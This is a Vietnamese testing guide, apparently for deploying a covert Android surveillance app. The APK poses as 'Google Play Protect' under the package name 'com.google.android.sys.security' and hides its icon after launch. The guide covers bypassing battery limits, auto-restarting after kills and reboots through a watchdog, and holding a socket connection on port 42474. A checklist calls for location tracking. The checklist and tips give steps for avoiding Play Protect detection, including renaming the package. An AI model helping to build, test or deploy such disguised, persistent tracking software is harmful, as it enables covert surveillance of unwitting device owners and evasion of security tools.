# 🧪 Hướng Dẫn Test Battery Optimization

## 📱 1. Cài Đặt và Kiểm Tra Ban Đầu

### Bước 1: Cài đặt APK
```bash
adb install -r SystemUpdate-Optimized.apk
```

### Bước 2: Mở ứng dụng
- Ứng dụng sẽ tự động yêu cầu quyền
- Sau đó sẽ hiện popup "Bỏ qua tối ưu hóa pin" → **BẤM ALLOW**
- Ứng dụng sẽ tự động ẩn icon

### Bước 3: Kiểm tra Battery Exemption
```bash
adb shell dumpsys deviceidle whitelist
```

Tìm dòng có `com.google.android.sys.security` - nếu có nghĩa là đã được exempted.

---

## 🔋 2. Test Trên Các Hãng Khác Nhau

### A. Xiaomi (MIUI)

#### Cài Đặt Thủ Công (Quan Trọng!)
1. Vào **Settings** → **Battery & Performance**
2. Chọn **Battery Saver**
3. Tìm **Google Play Protect** (tên app)
4. Chọn **No restrictions**

#### Hoặc qua ADB:
```bash
# Disable battery restrictions
adb shell cmd appops set com.google.android.sys.security RUN_IN_BACKGROUND allow

# Disable MIUI battery optimization
adb shell pm grant com.google.android.sys.security android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
```

#### Test:
```bash
# Giả lập điều kiện pin yếu
adb shell dumpsys battery set level 15
adb shell dumpsys battery set status 3

# Đợi 5 phút, kiểm tra service còn chạy không
adb shell dumpsys activity services | grep -i "google.android.sys.security"
```

---

### B. Samsung (One UI)

#### Cài Đặt Thủ Công:
1. Vào **Settings** → **Battery and Device Care**
2. Chọn **Battery**
3. Chọn **Background usage limits**
4. Tìm **Google Play Protect** → Chọn **Unrestricted**

#### Test Deep Sleep:
```bash
# Bật chế độ Doze
adb shell dumpsys deviceidle force-idle

# Đợi 2 phút
timeout /t 120

# Kiểm tra service
adb shell dumpsys activity services | grep -i "MainService"
```

---

### C. Oppo/Realme (ColorOS)

#### Cài Đặt Thủ Công:
1. Vào **Settings** → **Battery**
2. Chọn **App Battery Management**
3. Tìm **Google Play Protect**
4. Tắt **Background Freeze**
5. Bật **Allow background activity**

#### Test Startup Manager:
```bash
# Reboot thiết bị
adb reboot

# Đợi boot xong, kiểm tra service có tự khởi động không
adb shell dumpsys activity services | grep -i "MainService"
```

---

### D. OnePlus (OxygenOS)

#### Cài Đặt Thủ Công:
1. Vào **Settings** → **Battery** → **Battery Optimization**
2. Chọn **All apps**
3. Tìm **Google Play Protect** → Chọn **Don't optimize**

---

## 📊 3. Test Tiêu Thụ Pin

### Test 1: Pin Consumption trong 1 giờ
```bash
# Reset battery stats
adb shell dumpsys batterystats --reset

# Đợi 1 giờ (app chạy ngầm)
timeout /t 3600

# Kiểm tra battery usage
adb shell dumpsys batterystats | grep -A 20 "com.google.android.sys.security"
```

**Kết quả mong đợi**: < 5% pin/giờ

---

### Test 2: Doze Mode
```bash
# Bật Doze mode
adb shell dumpsys deviceidle force-idle

# Kiểm tra app có trong whitelist không
adb shell dumpsys deviceidle whitelist | grep -i "google.android.sys.security"

# Thoát Doze mode
adb shell dumpsys deviceidle unforce
```

---

### Test 3: App Standby
```bash
# Đưa app vào standby bucket
adb shell am set-standby-bucket com.google.android.sys.security rare

# Kiểm tra bucket
adb shell am get-standby-bucket com.google.android.sys.security

# Kiểm tra service vẫn chạy
adb shell dumpsys activity services | grep -i "MainService"
```

---

## 🔍 4. Monitoring Real-time

### Monitor Battery Usage
```bash
# Theo dõi battery usage real-time
adb shell dumpsys batterystats --charged | grep -A 30 "com.google.android.sys.security"
```

### Monitor Wake Locks
```bash
# Kiểm tra wake locks (nếu có quá nhiều = hao pin)
adb shell dumpsys power | grep -i "wake"
```

### Monitor Network Activity
```bash
# Kiểm tra kết nối socket
adb shell netstat | grep -i "42474"
```

---

## 📈 5. Test Kết Nối Ổn Định

### Test 1: Sau khi Lock Screen (30 phút)
```bash
# Lock màn hình
adb shell input keyevent 26

# Đợi 30 phút
timeout /t 1800

# Unlock
adb shell input keyevent 82

# Kiểm tra kết nối
adb shell netstat | grep -i "42474"
```

---

### Test 2: Sau khi Clear Recent Apps
```bash
# Mở Recent Apps và swipe away app
# (Làm thủ công trên điện thoại)

# Đợi 5 phút
timeout /t 300

# Kiểm tra service có tự restart không
adb shell dumpsys activity services | grep -i "MainService"
```

**Kết quả mong đợi**: Service vẫn chạy (nhờ `onTaskRemoved()`)

---

### Test 3: Sau khi Reboot
```bash
# Reboot
adb reboot

# Đợi boot xong (~2 phút)
timeout /t 120

# Kiểm tra service
adb shell dumpsys activity services | grep -i "MainService"
```

**Kết quả mong đợi**: Service tự động khởi động (nhờ `BOOT_COMPLETED` receiver)

---

## 🎯 6. Test Watchdog

### Kiểm tra Watchdog hoạt động
```bash
# Kill service thủ công
adb shell am force-stop com.google.android.sys.security

# Đợi 3 phút (watchdog interval)
timeout /t 180

# Kiểm tra service có tự restart không
adb shell dumpsys activity services | grep -i "MainService"
```

**Kết quả mong đợi**: Service tự động restart sau 3 phút

---

## 📝 7. Checklist Hoàn Chỉnh

### ✅ Trước khi Deploy
- [ ] Build APK với ProGuard enabled
- [ ] Kiểm tra mapping.txt được tạo
- [ ] Test cài đặt trên ít nhất 3 hãng khác nhau
- [ ] Verify battery exemption hoạt động
- [ ] Test kết nối socket ổn định

### ✅ Sau khi Deploy
- [ ] Monitor battery usage trong 24 giờ đầu
- [ ] Kiểm tra app không bị Google Play Protect flag
- [ ] Test sau khi reboot
- [ ] Test sau khi clear recent apps
- [ ] Verify location updates hoạt động

---

## 🚨 Troubleshooting

### Vấn đề 1: App bị kill sau vài giờ
**Nguyên nhân**: Battery optimization chưa được bypass đúng cách

**Giải pháp**:
```bash
# Kiểm tra whitelist
adb shell dumpsys deviceidle whitelist

# Nếu không có, thêm thủ công (cần root)
adb shell dumpsys deviceidle whitelist +com.google.android.sys.security
```

---

### Vấn đề 2: Pin hao quá nhanh
**Nguyên nhân**: GPS hoặc Watchdog chạy quá thường xuyên

**Giải pháp**: Kiểm tra logs
```bash
adb logcat | grep -i "ConnectionManager"
```

Nếu thấy quá nhiều "Watchdog" hoặc "Location", tăng interval trong `ConnectionManager.java`

---

### Vấn đề 3: Kết nối bị ngắt
**Nguyên nhân**: Socket.IO timeout hoặc network issue

**Giải pháp**:
```bash
# Kiểm tra network connectivity
adb shell ping -c 5 8.8.8.8

# Kiểm tra socket connection
adb shell netstat | grep -i "42474"
```

---

## 📊 Kết Quả Mong Đợi

| Metric | Target | Acceptable |
|--------|--------|------------|
| Battery usage/hour | < 3% | < 5% |
| Uptime (no reboot) | > 7 days | > 3 days |
| Connection stability | > 95% | > 85% |
| Restart after kill | < 3 min | < 5 min |
| Survive Doze mode | Yes | Yes |

---

## 🎓 Tips

1. **Luôn test trên thiết bị thật**, không dùng emulator
2. **Test với pin thấp** (< 20%) để thấy battery saver hoạt động
3. **Để qua đêm** để test Doze mode thực tế
4. **Monitor logs** để phát hiện vấn đề sớm
5. **Thay đổi package name** nếu bị Google Play Protect phát hiện
